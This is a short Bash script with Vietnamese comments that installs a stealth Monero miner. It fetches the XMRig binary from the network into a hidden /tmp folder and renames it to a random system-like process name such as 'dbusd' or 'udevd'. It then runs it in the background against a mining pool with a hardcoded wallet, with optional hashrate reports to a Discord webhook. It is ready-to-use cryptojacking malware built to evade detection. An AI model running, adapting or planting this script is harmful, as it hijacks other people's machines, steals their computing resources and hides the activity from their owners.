#!/bin/bash

# ========== CẤU HÌNH ==========
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
POOL="pool.hashvault.pro:443"
WORKER="silent_$(cat /etc/hostname 2>/dev/null || echo VM)"
DISCORD_WEBHOOK=""  # Để trống nếu không muốn gửi
# ==============================

CPU_THREADS=$(nproc --all)
CUSTOM_NAME=$(shuf -n1 -e "dbusd" "syscore" "logworker" "udevd" "corelogd")
INSTALL_DIR="/tmp/.xmrig_hidden"
LOG_FILE="/tmp/.xmrig_hidden.log"

echo "🚀 Đang cài XMRig stealth (Lite)..."

# Bước 1: Tạo thư mục ẩn
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Bước 2: Tải binary đã biên dịch
wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.1-linux-x64.tar.gz -O xmrig.tar.gz
tar -xzf xmrig.tar.gz
mv xmrig-*-linux-x64/xmrig "$CUSTOM_NAME"
chmod +x "$CUSTOM_NAME"
rm -rf xmrig.tar.gz xmrig-*-linux-x64

# Bước 3: Chạy ngầm
echo "🛠️ Đang khởi động tiến trình khai thác..."
nohup ./$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \
  --threads=$CPU_THREADS --donate-level=0 --max-cpu-usage=70 > "$LOG_FILE" 2>&1 &

# Bước 4 (tuỳ chọn): Gửi log về Discord
if [ ! -z "$DISCORD_WEBHOOK" ]; then
  sleep 15  # đợi có log
  HASHRATE=$(grep -i "speed" "$LOG_FILE" | tail -n1 | grep -oE "[0-9]+\.[0-9]+ h/s")
  curl -s -H "Content-Type: application/json" -X POST -d "{
    \"username\": \"XMRig Stealth\",
    \"content\": \"⛏️ Đang đào Monero\\n💻 Worker: \`$WORKER\`\\n📈 Hashrate: \`$HASHRATE\`\\n🧠 Threads: \`$CPU_THREADS\`\"
  }" "$DISCORD_WEBHOOK" >/dev/null 2>&1
fi

echo "✅ Đào đã chạy ngầm với tên tiến trình: $CUSTOM_NAME"
echo "📂 File log: $LOG_FILE"
